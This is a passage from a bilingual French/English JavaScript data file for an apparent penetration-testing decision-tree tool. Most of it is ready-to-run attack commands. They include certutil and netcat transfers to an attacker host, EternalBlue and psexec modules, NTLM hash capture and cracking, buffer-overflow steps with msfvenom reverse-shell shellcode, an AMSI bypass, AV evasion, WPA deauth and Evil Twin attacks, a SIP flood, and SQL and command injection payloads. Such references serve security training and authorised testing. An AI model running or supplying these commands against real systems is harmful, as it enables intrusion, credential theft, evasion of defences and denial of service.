      { label: "Certutil (Windows — LOLBin)", label_en: "Certutil (Windows — LOLBin)", cmd: "certutil -urlcache -split -f http://KALI_IP/file.exe C:\\temp\\file.exe" },
      { label: "WebDAV PUT upload (curl)", label_en: "WebDAV PUT upload (curl)", cmd: "curl -T 'shell.txt' 'http://TARGET/'\ncurl -X MOVE --header 'Destination:http://TARGET/shell.php' 'http://TARGET/shell.txt'" },
      { label: "davtest — upload automatique WebDAV", label_en: "davtest — automatic WebDAV upload", cmd: "davtest -move -sendbd auto -url http://TARGET" },
      { label: "FTP setup (Kali)", label_en: "FTP setup (Kali)", cmd: "apt-get install pure-ftpd\npure-pw useradd offsec -u ftpuser -d /ftphome\npure-pw mkdb\n/etc/init.d/pure-ftpd restart" },
      { label: "Netcat file transfer", label_en: "Netcat file transfer", cmd: "# Récepteur (Kali) :\nnc -lvp 4444 > received_file\n# Émetteur (cible) :\nnc KALI_IP 4444 < /path/to/file" },
      { label: "Meterpreter upload/download", label_en: "Meterpreter upload/download", cmd: "upload /local/file C:\\\\remote\\\\path\ndownload C:\\\\remote\\\\file /local/" },
      { label: "Nmap HTTP PUT", label_en: "Nmap HTTP PUT", cmd: "nmap -p80 TARGET --script http-put --script-args http-put.url='/shell.php',http-put.file='/var/www/html/shell.php'" }
    ],
    lookfor: [
      "Quel protocole est autorisé en sortie ? HTTP/S, FTP, TFTP, DNS ?",
      "Windows : certutil et PowerShell sont souvent disponibles",
      "WebDAV activé sur le serveur web ?",
      "Antivirus → UPX packer ou obfuscation nécessaire ?"
    ],
    lookfor_en: [
      "Which outbound protocol is allowed? HTTP/S, FTP, TFTP, DNS?",
      "Windows: certutil and PowerShell are usually available",
      "WebDAV enabled on the web server?",
      "Antivirus → UPX packer or obfuscation required?"
    ],
    tips: [
      "Python3 http.server est le plus simple et rapide pour servir des fichiers",
      "Certutil est un LOLBin Windows souvent non bloqué par les AV",
      "En cas de restrictions : base64 encode le fichier et le decoder côté cible",
      "Pour contourner les proxies : utiliser le port 443 (HTTPS)"
    ],
    tips_en: [
      "Python3 http.server is the simplest and fastest way to serve files",
      "Certutil is a Windows LOLBin often not blocked by AV",
      "When restricted: base64-encode the file and decode it on the target side",
      "To bypass proxies: use port 443 (HTTPS)"
    ],
    choices: [
      { label: "Fichier exécuté → shell obtenu", label_en: "File executed → shell obtained", next: "shell_stabilize", icon: "✅" },
      { label: "AV bloque → bypass AV", label_en: "AV blocks → AV bypass", next: "cheat_av_bypass", icon: "🛡️" },
      { label: "Retour aux techniques de pivoting", label_en: "Back to pivoting techniques", next: "cheat_pivoting", icon: "🔀" }
    ]
  },

  // ── SMB ──────────────────────────────────────────────────────────────────────
  "cheat_smb": {
    id: "cheat_smb", title: "SMB Enumération & Capture — Cheatsheet", title_en: "SMB Enumeration & Capture — Cheatsheet",
    category: "network", icon: "🗂️",
    description: "Enumération SMB complète, null sessions, capture NTLM et NBNS spoofing (Cheatsheet-God).",
    description_en: "Complete SMB enumeration, null sessions, NTLM capture, and NBNS spoofing (Cheatsheet-God).",
    commands: [
      { label: "Scan SMB nmap", label_en: "SMB nmap scan", cmd: "nmap -v -p 139,445 TARGET\nnmap --script smb-os-discovery.nse TARGET\nnmap -sV -Pn -p 445 --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' TARGET" },
      { label: "NBTScan", label_en: "NBTScan", cmd: "nbtscan -r 10.0.2.0/24" },
      { label: "SMBClient — lister les partages", label_en: "SMBClient — list shares", cmd: "smbclient -L //TARGET\nsmbclient -L //TARGET -N     # null session\nsmbclient //TARGET/share -N" },
      { label: "RPCClient — null session", label_en: "RPCClient — null session", cmd: "rpcclient -U \"\" TARGET\nrpcclient> enumprivs\nrpcclient> enumdomusers\nrpcclient> queryuser 0x1f4" },
      { label: "Enum4linux — énumération complète", label_en: "Enum4linux — full enumeration", cmd: "enum4linux -a TARGET" },
      { label: "Nmap SMB vulnérabilités", label_en: "Nmap SMB vulnerabilities", cmd: "nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 TARGET" },
      { label: "Nmap — lister partages SMB", label_en: "Nmap — list SMB shares", cmd: "nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=user,smbpass=pass -p445 TARGET" },
      { label: "Nmap — lister utilisateurs SMB", label_en: "Nmap — list SMB users", cmd: "nmap -sU -sS --script=smb-enum-users -p U:137,T:139 TARGET" },
      { label: "EternalBlue (MS17-010)", label_en: "EternalBlue (MS17-010)", cmd: "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS TARGET\nexploit" },
      { label: "NBNS Spoof (MSF)", label_en: "NBNS Spoof (MSF)", cmd: "use auxiliary/spoof/nbns/nbns_response\nset INTERFACE eth0\nset SPOOFIP KALI_IP\nrun" },
      { label: "SMB Capture — capturer hashes NTLM", label_en: "SMB Capture — capture NTLM hashes", cmd: "use auxiliary/server/capture/smb\nset JOHNPWFILE /tmp/john_smb\nrun\n# Cracker ensuite :\njohn /tmp/john_smb.txt --wordlist=/usr/share/wordlists/rockyou.txt" },
      { label: "HTTP NTLM Capture", label_en: "HTTP NTLM Capture", cmd: "use auxiliary/server/capture/http_ntlm\nset JOHNPWFILE /tmp/john_http\nset SRVPORT 80\nset URIPATH /\nrun" },
      { label: "null session Windows", label_en: "Windows null session", cmd: "net use \\\\TARGET\\IPC$ \"\" /u:\"\"" },
      { label: "RID cycling — enum users", label_en: "RID cycling — enumerate users", cmd: "ridenum.py TARGET 500 50000 wordlist.txt" },
      { label: "CrackMapExec", label_en: "CrackMapExec", cmd: "crackmapexec smb TARGET -u user -p pass\ncrackmapexec smb TARGET -u user -p pass --shares\ncrackmapexec smb TARGET -u user -p pass --sam" }
    ],
    lookfor: [
      "Null session possible ? → smbclient -N",
      "Partages en lecture/écriture accessibles anonymement ?",
      "MS17-010 / EternalBlue patch manquant ?",
      "Hash NTLM capturé → cracker avec john/hashcat"
    ],
    lookfor_en: [
      "Null session possible? → smbclient -N",
      "Read/write shares accessible anonymously?",
      "MS17-010 / EternalBlue patch missing?",
      "NTLM hash captured → crack with john/hashcat"
    ],
    tips: [
      "enum4linux -a est souvent suffisant pour l'énumération initiale",
      "Les hashes NTLM peuvent être utilisés en pass-the-hash (pth-winexe)",
      "Responder est plus efficace que MSF pour la capture NTLM en réseau local",
      "SMB signing désactivé = susceptible aux attaques NTLM relay"
    ],
    tips_en: [
      "enum4linux -a is usually sufficient for initial enumeration",
      "NTLM hashes can be used for pass-the-hash attacks (pth-winexe)",
      "Responder is more effective than MSF for NTLM capture on a local network",
      "SMB signing disabled = vulnerable to NTLM relay attacks"
    ],
    choices: [
      { label: "Credentials obtenus → accès SMB", label_en: "Credentials obtained → SMB access", next: "smb_authenticated", icon: "✅" },
      { label: "EternalBlue réussi → meterpreter SYSTEM", label_en: "EternalBlue succeeded → meterpreter SYSTEM", next: "cheat_metasploit", icon: "🎯" },
      { label: "Hash capturé → cracking", label_en: "Hash captured → cracking", next: "credentials_found", icon: "🔑" }
    ]
  },

  // ── EXPLOIT DEV ──────────────────────────────────────────────────────────────
  "cheat_exploit_dev": {
    id: "cheat_exploit_dev", title: "Exploit Development — Cheatsheet", title_en: "Exploit Development — Cheatsheet",
    category: "exploit", icon: "💀",
    description: "Fuzzing, bad chars, SEH exploitation et méthodologie BOF avec Immunity Debugger (Cheatsheet-God).",
    description_en: "Fuzzing, bad chars, SEH exploitation, and BOF methodology with Immunity Debugger (Cheatsheet-God).",
    commands: [
      { label: "Script de fuzzing Python", label_en: "Python fuzzing script", cmd: "import socket\nbuffer=[\"A\"]\ncounter=50\nwhile len(buffer)<=1000:\n    buffer.append(\"A\"*counter)\n    counter+=50\nfor s in buffer:\n    sock=socket.socket()\n    sock.connect((\"TARGET\",PORT))\n    sock.send(s.encode())\n    sock.close()" },
      { label: "Créer un pattern cyclique", label_en: "Create a cyclic pattern", cmd: "msf-pattern_create -l 4000\n# Coller le pattern dans le payload" },
      { label: "Calculer l'offset depuis EIP", label_en: "Calculate offset from EIP", cmd: "msf-pattern_offset -q <valeur_EIP>" },
      { label: "Bad characters — séquence complète", label_en: "Bad characters — full sequence", cmd: "# Injecter tous les bytes de \\x01 à \\xff\n# \\x00 est presque toujours un bad char\nbadchars = b\"\\x01\\x02...\\xff\"" },
      { label: "Mona — trouver le pattern MSP", label_en: "Mona — find MSP pattern", cmd: "!mona findmsp\n!mona pattern_create 4000" },
      { label: "Mona — modules sans protections", label_en: "Mona — modules without protections", cmd: "!mona modules\n# Chercher : Rebase=False, SafeSEH=False, ASLR=False, NXCompat=False" },
      { label: "Mona — trouver JMP ESP", label_en: "Mona — find JMP ESP", cmd: "# Dans Immunity Debugger, double-cliquer sur le module cible, puis :\n# Clic droit → Search for → Command → JMP ESP\n# OU :\n!mona find -s \"\\xff\\xe4\" -m module.dll" },
      { label: "nasm_shell — opcodes", label_en: "nasm_shell — opcodes", cmd: "msf-nasm_shell\nnasm shell> JMP ESP\n# Résultat : FFE4 → utiliser \\xff\\xe4 dans le payload" },
      { label: "SEH exploitation", label_en: "SEH exploitation", cmd: "# 1. Crasher l'app\n# 2. View → SEH chain (vérifier overwrite)\n# 3. !mona pattern_create <len>\n# 4. !mona findmsp → offset vers nSEH\n# 5. !mona seh -cpb <bad_chars> → POP/POP/RET\n# 6. Short jump : \\xeb\\x06\\x90\\x90 + adresse POP/POP/RET\n# 7. Shellcode après le saut" },
      { label: "Générer shellcode (msfvenom)", label_en: "Generate shellcode (msfvenom)", cmd: "msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=443 EXITFUNC=thread -e x86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\" -f python" },
      { label: "Structure payload finale", label_en: "Final payload structure", cmd: "# payload = \"A\"*offset + JMP_ESP_addr (little-endian) + \"\\x90\"*16 + shellcode\n# Vérifier : padding suffisant pour que le crash se produise encore" }
    ],
    lookfor: [
      "EIP écrasé avec 42424242 (BBBB) ? → offset correct",
      "ESP pointe vers la zone contrôlée ? → JMP ESP",
      "SEH overwrite visible dans la SEH chain ?",
      "Module sans DEP/ASLR/SafeSEH disponible ?"
    ],
    lookfor_en: [
      "EIP overwritten with 42424242 (BBBB)? → correct offset",
      "ESP pointing to controlled area? → JMP ESP",
      "SEH overwrite visible in the SEH chain?",
      "Module without DEP/ASLR/SafeSEH available?"
    ],
    tips: [
      "EXITFUNC=thread permet de récupérer le shell sans crasher le process",
      "NOP sled de 16 octets minimum avant le shellcode",
      "Immunity Debugger + Mona = combo indispensable pour Windows BOF",
      "Pour Linux : GDB + GEF ou PEDA pour le même workflow"
    ],
    tips_en: [
      "EXITFUNC=thread allows catching the shell without crashing the process",
      "Minimum 16-byte NOP sled before the shellcode",
      "Immunity Debugger + Mona = essential combo for Windows BOF",
      "For Linux: GDB + GEF or PEDA for the same workflow"
    ],
    choices: [
      { label: "Shell obtenu via BOF", label_en: "Shell obtained via BOF", next: "shell_stabilize", icon: "✅" },
      { label: "BOF Linux → GDB", label_en: "Linux BOF → GDB", next: "cheat_gdb", icon: "🔬" },
      { label: "BOF Windows → workflow complet", label_en: "Windows BOF → full workflow", next: "cheat_bof", icon: "🐛" }
    ]
  },

  // ── BOF (WALKTHROUGH) ────────────────────────────────────────────────────────
  "cheat_bof": {
    id: "cheat_bof", title: "Buffer Overflow — Walkthrough", title_en: "Buffer Overflow — Walkthrough",
    category: "exploit", icon: "🐛",
    description: "Méthodologie complète BOF Windows (exemple SLMail) : fuzzing → offset → bad chars → JMP ESP → shellcode (Cheatsheet-God).",
    description_en: "Complete Windows BOF methodology (SLMail example): fuzzing → offset → bad chars → JMP ESP → shellcode (Cheatsheet-God).",
    commands: [
      { label: "Etape 1 — Fuzzer (trouver la taille)", label_en: "Step 1 — Fuzzer (find crash size)", cmd: "# Lancer inititalFuzzer.py\n# Le programme crashe à ~2700 bytes" },
      { label: "Etape 2 — Choisir taille payload", label_en: "Step 2 — Choose payload size", cmd: "# Tester 3000 et 4000 → EIP = 41414141\n# Choisir 4000" },
      { label: "Etape 3 — Pattern pour offset EIP", label_en: "Step 3 — Pattern for EIP offset", cmd: "msf-pattern_create -l 4000\n# Utiliser pattern comme payload → noter valeur EIP dans Immunity\nmsf-pattern_offset -q <EIP_value>\n# Ex: offset = 2606" },
      { label: "Etape 4 — Vérifier l'offset", label_en: "Step 4 — Verify offset", cmd: "# Payload: 'A'*2606 + 'BBBB' + 'C'*reste\n# Immunity doit montrer EIP = 42424242 (BBBB)" },
      { label: "Etape 5 — Bad chars", label_en: "Step 5 — Bad chars", cmd: "# Injecter \\x01 à \\xff après l'EIP\n# Regarder dans Immunity dump ESP quel byte rompt la séquence\n# Supprimer et relancer jusqu'à avoir tous les bad chars\n# Ex: \\x00\\x0a\\x0d" },
      { label: "Etape 6 — Trouver JMP ESP", label_en: "Step 6 — Find JMP ESP", cmd: "!mona modules\n# Choisir dll sans protections\n!mona find -s \"\\xff\\xe4\" -m chosen_dll.dll\n# Vérifier l'adresse ne contient pas de bad chars" },
      { label: "Etape 7 — Générer le shellcode", label_en: "Step 7 — Generate shellcode", cmd: "msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=443 EXITFUNC=thread -e x86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\" -f python" },
      { label: "Etape 8 — Payload final", label_en: "Step 8 — Final payload", cmd: "# payload = 'A'*2606 + struct.pack('<I', JMP_ESP_ADDR) + '\\x90'*16 + shellcode\n# Lancer listener : nc -lvp 443\n# Envoyer le payload → shell SYSTEM" }
    ],
    lookfor: [
      "Programme crash + EIP contrôlé ?",
      "Espace suffisant pour le shellcode (~400+ bytes) ?",
      "Bad chars identifiés correctement ?",
      "Adresse JMP ESP sans bad chars ?"
    ],
    lookfor_en: [
      "Program crashes + EIP controlled?",
      "Enough space for the shellcode (~400+ bytes)?",
      "Bad chars correctly identified?",
      "JMP ESP address free of bad chars?"
    ],
    tips: [
      "La séquence des bad chars doit être contiguë dans le dump mémoire",
      "NOP sled (\\x90) de 16+ bytes donne de la marge au shellcode",
      "EXITFUNC=thread = le service continue de tourner après exploitation",
      "Poser un breakpoint sur JMP ESP pour valider le flow d'exécution"
    ],
    tips_en: [
      "The bad char sequence must be contiguous in the memory dump",
      "NOP sled (\\x90) of 16+ bytes gives the shellcode room to land",
      "EXITFUNC=thread = the service keeps running after exploitation",
      "Set a breakpoint on JMP ESP to validate the execution flow"
    ],
    choices: [
      { label: "Shell obtenu → stabiliser", label_en: "Shell obtained → stabilize", next: "shell_stabilize", icon: "✅" },
      { label: "GDB pour BOF Linux", label_en: "GDB for Linux BOF", next: "cheat_gdb", icon: "🔬" }
    ]
  },

  // ── AV BYPASS ────────────────────────────────────────────────────────────────
  "cheat_av_bypass": {
    id: "cheat_av_bypass", title: "AV Bypass — Cheatsheet", title_en: "AV Bypass — Cheatsheet",
    category: "exploit", icon: "🛡️",
    description: "Contournement antivirus avec Veil, MSF psexec custom et techniques d'obfuscation (Cheatsheet-God).",
    description_en: "Antivirus bypass with Veil, custom MSF psexec, and obfuscation techniques (Cheatsheet-God).",
    commands: [
      { label: "Veil-Evasion — générer payload AV-bypass", label_en: "Veil-Evasion — generate AV-bypass payload", cmd: "git clone https://github.com/Veil-Framework/Veil-Evasion.git\ncd Veil-Evasion/setup && ./setup.sh -c\n# Puis lancer Veil et générer un payload obfusqué" },
      { label: "MSF psexec avec payload custom Veil", label_en: "MSF psexec with custom Veil payload", cmd: "use exploit/windows/smb/psexec\nset RHOST TARGET_IP\nset SMBUser user\nset SMBPass password\nset EXE::Custom /root/veil_payload.exe\nexploit" },
      { label: "Encoder le payload msfvenom", label_en: "Encode msfvenom payload", cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe" },
      { label: "UPX packer", label_en: "UPX packer", cmd: "upx -9 payload.exe" },
      { label: "exe2bat — convertir EXE en script", label_en: "exe2bat — convert EXE to script", cmd: "locate exe2bat\nwine exe2bat.exe nc.exe nc.txt\n# Coller nc.txt dans le shell Windows" },
      { label: "PyInstaller — compiler Python en EXE", label_en: "PyInstaller — compile Python to EXE", cmd: "pip install pyinstaller\npyinstaller --onefile exploit.py" },
      { label: "PowerShell AMSI bypass (base)", label_en: "PowerShell AMSI bypass (basic)", cmd: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)" },
      { label: "Invoke-Shellcode via PowerSploit", label_en: "Invoke-Shellcode via PowerSploit", cmd: "# https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1\npowershell -ExecutionPolicy Bypass -c \"& { . .\\Invoke-Shellcode.ps1; Invoke-Shellcode -Shellcode @(payload) }\"" }
    ],
    lookfor: [
      "Quel AV est présent ? (Defender, ESET, Symantec…)",
      "Sandbox detection possible ? → time delays",
      "PowerShell autorisé ? → fileless malware",
      "SMB disponible ? → psexec avec payload custom"
    ],
    lookfor_en: [
      "Which AV is present? (Defender, ESET, Symantec…)",
      "Sandbox detection possible? → time delays",
      "PowerShell allowed? → fileless malware",
      "SMB available? → psexec with custom payload"
    ],
    tips: [
      "Veil génère des payloads Python/Ruby/C compilés qui bypassent les signatures statiques",
      "Ajouter plusieurs couches d'encodage msfvenom (-i 10) réduit les détections",
      "Le fileless via PowerShell est souvent plus efficace que les EXE",
      "VirusTotal partage les samples avec les AV → utiliser antiscan.me pour tester"
    ],
    tips_en: [
      "Veil generates compiled Python/Ruby/C payloads that bypass static signatures",
      "Adding multiple msfvenom encoding layers (-i 10) reduces detections",
      "Fileless via PowerShell is often more effective than EXE payloads",
      "VirusTotal shares samples with AVs → use antiscan.me for testing"
    ],
    choices: [
      { label: "Payload exécuté → shell meterpreter", label_en: "Payload executed → meterpreter shell", next: "cheat_metasploit", icon: "🎯" },
      { label: "Transférer le payload", label_en: "Transfer the payload", next: "cheat_transfer", icon: "📦" }
    ]
  },

  // ── WIRELESS ─────────────────────────────────────────────────────────────────
  "cheat_wireless": {
    id: "cheat_wireless", title: "Wireless Testing — Cheatsheet", title_en: "Wireless Testing — Cheatsheet",
    category: "network", icon: "📡",
    description: "Tests WPA2/WPA/WEP avec aircrack-ng, Reaver (WPS), Evil Twin et MAC filtering bypass (Cheatsheet-God).",
    description_en: "WPA2/WPA/WEP testing with aircrack-ng, Reaver (WPS), Evil Twin, and MAC filtering bypass (Cheatsheet-God).",
    commands: [
      { label: "Préparer l'interface monitor", label_en: "Set up monitor interface", cmd: "sudo airmon-ng check kill\nsudo airmon-ng start wlan0\nifconfig wlan0mon up" },
      { label: "Scanner les réseaux", label_en: "Scan networks", cmd: "sudo airodump-ng wlan0mon" },
      { label: "Capturer un réseau spécifique", label_en: "Capture a specific network", cmd: "sudo airodump-ng --bssid <BSSID> -c <channel> wlan0mon -w capture" },
      { label: "Deauth client → capturer handshake WPA", label_en: "Deauth client → capture WPA handshake", cmd: "sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon\n# ou cibler un client :\nsudo aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> wlan0mon" },
      { label: "Cracker WPA/WPA2 (dict)", label_en: "Crack WPA/WPA2 (dictionary)", cmd: "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap\n# Brute force avec crunch :\ncrunch 8 8 0123456789 | aircrack-ng -e \"SSID\" -w - capture.eapol.cap" },
      { label: "Reaver — attaque WPS", label_en: "Reaver — WPS attack", cmd: "airmon-ng start wlan0\nwash -i wlan0mon -C\nreaver -i wlan0mon -b <BSSID> -vv -S" },
      { label: "Pixie WPS", label_en: "Pixie WPS", cmd: "airodump-ng wlan0mon --wps\nreaver -i wlan0mon -c <channel> -b <BSSID> -K 1" },
      { label: "WEP — ARP replay attack", label_en: "WEP — ARP replay attack", cmd: "airmon-ng start wlan0\nairodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon\naireplay-ng -3 -x 1000 -n 1000 -b <BSSID> -h <OUR_MAC> wlan0mon\naircrack-ng -b <BSSID> capture-01.cap" },
      { label: "Bypass MAC filtering", label_en: "Bypass MAC filtering", cmd: "aireplay-ng -0 10 -a <BSSID> -c <VICTIM_MAC> wlan0mon\nifconfig wlan0mon down\nmacchanger --mac <VICTIM_MAC> wlan0mon\nifconfig wlan0mon up" },
      { label: "Augmenter TX power", label_en: "Increase TX power", cmd: "iw reg set BO\niwconfig wlan0 txpower 30" },
      { label: "Evil Twin / MITM wireless", label_en: "Evil Twin / wireless MITM", cmd: "airbase-ng -e \"<FAKE_SSID>\" wlan0mon\nbrctl addbr bridge0\nbrctl addif bridge0 wlan0mon\nbrctl addif bridge0 at0\nifconfig bridge0 up\naireplay-ng --deauth 0 -a <VICTIM_BSSID> wlan0mon" }
    ],
    lookfor: [
      "WPS activé ? → Reaver/Pixie attack",
      "WEP = toujours cassable en quelques minutes",
      "Clients connectés visibles → deauth pour capturer handshake",
      "Réseau caché → SSID révélé après deauth"
    ],
    lookfor_en: [
      "WPS enabled? → Reaver/Pixie attack",
      "WEP = always crackable in minutes",
      "Connected clients visible → deauth to capture handshake",
      "Hidden network → SSID revealed after deauth"
    ],
    tips: [
      "airmon-ng check kill évite les interférences NetworkManager",
      "Pixie WPS est beaucoup plus rapide que le brute force WPS classique",
      "Sur les réseaux WPA-Enterprise : capturer MSCHAPV2 + asleap pour crack",
      "Augmenter le TX power améliore la portée mais peut être illégal selon le pays"
    ],
    tips_en: [
      "airmon-ng check kill avoids NetworkManager interference",
      "Pixie WPS is much faster than classic WPS brute force",
      "On WPA-Enterprise networks: capture MSCHAPV2 + asleap to crack",
      "Increasing TX power improves range but may be illegal depending on the country"
    ],
    choices: [
      { label: "PSK craquée → connecté au réseau", label_en: "PSK cracked → connected to network", next: "start", icon: "🎯" },
      { label: "MITM actif → capturer trafic", label_en: "Active MITM → capture traffic", next: "cheat_smb", icon: "🗂️" }
    ]
  },

  // ── VOIP ─────────────────────────────────────────────────────────────────────
  "cheat_voip": {
    id: "cheat_voip", title: "VOIP / SIP — Cheatsheet", title_en: "VOIP / SIP — Cheatsheet",
    category: "network", icon: "📞",
    description: "Enumération SIP, eavesdropping, cracking SIP digest et attaques DoS VoIP (Cheatsheet-God).",
    description_en: "SIP enumeration, eavesdropping, SIP digest cracking, and VoIP DoS attacks (Cheatsheet-God).",
    commands: [
      { label: "SMAP — scanner SIP", label_en: "SMAP — SIP scanner", cmd: "./smap 192.168.1.0/24\n./smap -O 192.168.1.104   # fingerprinting OS" },
      { label: "SVMAP (SIPVicious) — scanner", label_en: "SVMAP (SIPVicious) — scanner", cmd: "./svmap.py 192.168.1.0/24\n./svmap.py 192.168.1.0/24 --fp" },
      { label: "SIPSAK — tester OPTIONS", label_en: "SIPSAK — test OPTIONS", cmd: "sipsak -vv -s sip:192.168.1.221" },
      { label: "Svwar — énumérer extensions SIP", label_en: "Svwar — enumerate SIP extensions", cmd: "./svwar.py -e100-400 192.168.1.104\n./svwar.py -e100-400 192.168.1.104 -m INVITE -v" },
      { label: "Enumiax — énumérer usernames IAX", label_en: "Enumiax — enumerate IAX usernames", cmd: "./enumiax -v -m3 -M3 192.168.1.104" },
      { label: "ARP poisoning pour MITM", label_en: "ARP poisoning for MITM", cmd: "echo 1 > /proc/sys/net/ipv4/ip_forward\narpspoof -t VICTIM GATEWAY\narpspoof -t GATEWAY VICTIM" },
      { label: "SIPDump — capturer auth SIP", label_en: "SIPDump — capture SIP auth", cmd: "./sipdump -i eth0 auth.txt\n./sipdump -p registration.pcap auth.txt" },
      { label: "SIPCrack — cracker hashes SIP", label_en: "SIPCrack — crack SIP hashes", cmd: "./sipcrack -w sipass.txt auth.txt" },
      { label: "Brute force comptes SIP", label_en: "Brute force SIP accounts", cmd: "./svcrack.py -u200 -d wordlist.txt 192.168.1.104\n./svcrack.py -u200 -r100000-999999 192.168.1.104" },
      { label: "VLAN hopping pour VoIP", label_en: "VLAN hopping for VoIP", cmd: "modprobe 8021q\n./voiphopper -i eth0 -c 0\n./voiphopper -i eth0 -v 20" },
      { label: "InviteFlood — DoS SIP", label_en: "InviteFlood — SIP DoS", cmd: "./inviteflood eth0 <ext> <domain> <target_ip> <nb_packets>" },
      { label: "MSF — scanner SIP", label_en: "MSF — SIP scanner", cmd: "use auxiliary/scanner/sip/options\nuse scanner/sip/enumerator\nset RHOSTS 192.168.1.104\nset MINEXT 100\nset MAXEXT 500\nrun" },
      { label: "MSF — spoof Caller ID", label_en: "MSF — spoof Caller ID", cmd: "use auxiliary/voip/sip_invite_spoof" },
      { label: "Wireshark — écouter appels VoIP", label_en: "Wireshark — intercept VoIP calls", cmd: "# Filtre : not broadcast and not multicast and host <IP>\n# Statistics → VoIP Calls → décoder en audio" }
    ],
    lookfor: [
      "Port 5060/5061 ouvert → SIP disponible",
      "Authentification SIP capturée ? → digest crack",
      "WireShark → Statistics → VoIP Calls pour décoder les appels",
      "VLAN VoIP séparé accessible ?"
    ],
    lookfor_en: [
      "Port 5060/5061 open → SIP available",
      "SIP authentication captured? → digest crack",
      "WireShark → Statistics → VoIP Calls to decode calls",
      "Separate VoIP VLAN reachable?"
    ],
    tips: [
      "SIP utilise UDP par défaut → scanner avec -sU nmap",
      "Les hashes SIP digest sont au format md5 → hashcat -m 11400",
      "SIPVicious suite (svmap+svwar+svcrack) = toolkit complet",
      "Les téléphones IP ont souvent des credentials constructeur par défaut"
    ],
    tips_en: [
      "SIP uses UDP by default → scan with nmap -sU",
      "SIP digest hashes are md5 format → hashcat -m 11400",
      "SIPVicious suite (svmap+svwar+svcrack) = complete toolkit",
      "IP phones often have factory-default credentials"
    ],
    choices: [
      { label: "Credentials SIP obtenus → accès pbx", label_en: "SIP credentials obtained → PBX access", next: "start", icon: "🎯" },
      { label: "MITM réseau → capturer trafic", label_en: "Network MITM → capture traffic", next: "cheat_smb", icon: "🗂️" }
    ]
  },

  // ── SQL INJECTION ────────────────────────────────────────────────────────────
  "cheat_sqli": {
    id: "cheat_sqli", title: "SQL Injection — Cheatsheet", title_en: "SQL Injection — Cheatsheet",
    category: "web", icon: "💉",
    description: "Union-based, blind SQLi, SQLmap et command injection (Cheatsheet-God).",
    description_en: "Union-based, blind SQLi, SQLmap, and command injection (Cheatsheet-God).",
    commands: [
      { label: "Test basique", label_en: "Basic test", cmd: "' OR 1=1#\n' OR 1=1 --\n' OR 'b'='b" },
      { label: "Nombre de colonnes (ORDER BY)", label_en: "Column count (ORDER BY)", cmd: "' ORDER BY 1--\n' ORDER BY 2--\n# Augmenter jusqu'à erreur → nb colonnes = dernier sans erreur" },
      { label: "Nombre de colonnes (NULL)", label_en: "Column count (NULL)", cmd: "' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--" },
      { label: "UNION — extraire données", label_en: "UNION — extract data", cmd: "' UNION SELECT version(),database()#\n' UNION SELECT user(),2#\n' UNION ALL SELECT table_name,2 FROM information_schema.tables#\n' UNION ALL SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'#\n' UNION ALL SELECT concat(user,char(58),password),2 FROM users#" },
      { label: "Version DB", label_en: "DB version", cmd: "# MySQL/MSSQL : SELECT @@version\n# Oracle     : SELECT * FROM v$version\n# PostgreSQL : SELECT version()" },
      { label: "Tables (non-Oracle)", label_en: "Tables (non-Oracle)", cmd: "SELECT TABLE_NAME FROM information_schema.tables" },
      { label: "Tables (Oracle)", label_en: "Tables (Oracle)", cmd: "SELECT table_name FROM all_tables\nSELECT column_name,table_name FROM cols" },
      { label: "Blind SQLi — délai", label_en: "Blind SQLi — time delay", cmd: "# MySQL : ' AND SLEEP(5)--\n# MSSQL : '; WAITFOR DELAY '0:0:5'--\n# PostgreSQL : '; SELECT pg_sleep(5)--" },
      { label: "SQLmap basique", label_en: "SQLmap basic", cmd: "sqlmap --url=\"http://TARGET/page?id=1\" -p id --dbms=MySQL --banner --dbs" },
      { label: "SQLmap depuis fichier Burp", label_en: "SQLmap from Burp request file", cmd: "sqlmap -r login.req --level=5 --risk=3 --threads=10 --tables\nsqlmap -r login.req --level=5 --risk=3 -T users --dump\nsqlmap -r login.req --level=5 --risk=3 --os-shell" },
      { label: "Command injection — séparateurs", label_en: "Command injection — separators", cmd: "& | ; || && `cmd` $(cmd)\n# Test blind :\nping -c 10 KALI_IP\nnslookup `whoami`.yourdomain.com" }
    ],
    lookfor: [
      "Erreur SQL visible ? → SQLi confirmé",
      "Comportement différent avec OR 1=1 vs OR 1=2 ?",
      "Nombre de colonnes determiné → UNION possible",
      "Blind ? → time-based ou DNS out-of-band"
    ],
    lookfor_en: [
      "SQL error visible? → SQLi confirmed",
      "Different behavior with OR 1=1 vs OR 1=2?",
      "Column count determined → UNION possible",
      "Blind? → time-based or DNS out-of-band"
    ],
    tips: [
      "Toujours tester ' en premier → regarder les erreurs",
      "SQLmap avec --level=5 --risk=3 est le plus complet mais bruyant",
      "Pour l'injection de commandes : tenter d'abord ; whoami puis blind",
      "OS shell via SQLmap nécessite souvent les privilèges DBA"
    ],
    tips_en: [
      "Always test ' first → look for errors",
      "SQLmap with --level=5 --risk=3 is the most thorough but noisy",
      "For command injection: try ; whoami first, then blind",
      "OS shell via SQLmap usually requires DBA privileges"
    ],
    choices: [
      { label: "Shell OS obtenu via SQLmap", label_en: "OS shell obtained via SQLmap", next: "shell_stabilize", icon: "✅" },
      { label: "Credentials DB extraits", label_en: "DB credentials extracted", next: "credentials_found", icon: "🔑" }
    ]
  },

  // ── DOMAIN ADMIN ─────────────────────────────────────────────────────────────
  "cheat_domain_admin": {
    id: "cheat_domain_admin", title: "Domain Admin Exploitation — Cheatsheet", title_en: "Domain Admin Exploitation — Cheatsheet",
